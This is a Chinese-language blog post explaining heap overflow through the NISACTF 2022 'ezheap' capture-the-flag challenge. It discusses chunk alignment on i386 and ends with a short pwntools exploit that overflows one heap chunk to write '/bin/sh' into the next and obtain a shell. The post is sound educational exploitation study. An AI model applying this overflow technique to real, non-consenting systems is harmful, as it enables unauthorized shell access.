# 堆溢出利用


## Heap Overflow

堆溢出的概念其实和栈溢出、缓冲区溢出的概念非常相似，而且就连利用方式也非常相似，因为chunk之间是连续的。那么只要有`read`或者`get`函数的不规范使用，依然可以通过当前的chunk修改相邻chunk的内容。但是这个威胁就小很多，因为heap中不会保存程序运行的状态内容，基本都是用户数据，所以在heap中没有办法劫持程序的运行流程（PC寄存器）。但是，heap中往往存在用户数据，复写后可能导致越权之类的现象出现。下面以一个非常简单的example理解heap overflow。

## [NISACTF 2022]ezheap

程序其实非常简单，就是连续call了两个0x16的malloc，然后只往第一个chunk写数据，通过heap overflow覆写第二个chunk的数据，然后利用system函数getshell。这里有一个要注意的点是由于是i386程序，0x16的malloc实际上要对齐到0x20的。由于相邻的两个chunk都有0x4的chunk_size，那我们输入0x20个字符就可以刚好覆盖到下一个chunk的data部分，写入`/bin/sh`即可。

我们先观察写入前的chunks：

![chunks](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231211172115171.png)

这里可以看出来0x21e29那个是top chunk。我们将数据写入：

![overflow](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231211172406437.png)

这边就发现一个很有意思的问题，就是data部分并不是紧跟着size的。而是空出了4个字节。我们再看下刚好输入0x16个字节的chunk情况：

![normal](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231211172702754.png)

我们发现它既在header补了4字节，又在chunk的末尾补了2字节🤣。这种对齐的方式还是挺让人难以捉摸的。不管了，反正最后成功getshell了。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231211172937995.png)

## Exploit

```python
from pwn import *

context.terminal=['tmux','splitw','-h']
elf = ELF('./pwn')
r = elf.process()
# r = remote('node5.anna.nssctf.cn',28186)

payload = b'a' * 0x20 + b'/bin/sh\x00'
r.recvuntil(b'Input:\n')
r.sendline(payload)

r.interactive()
```





---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/12/heap_overflow/  

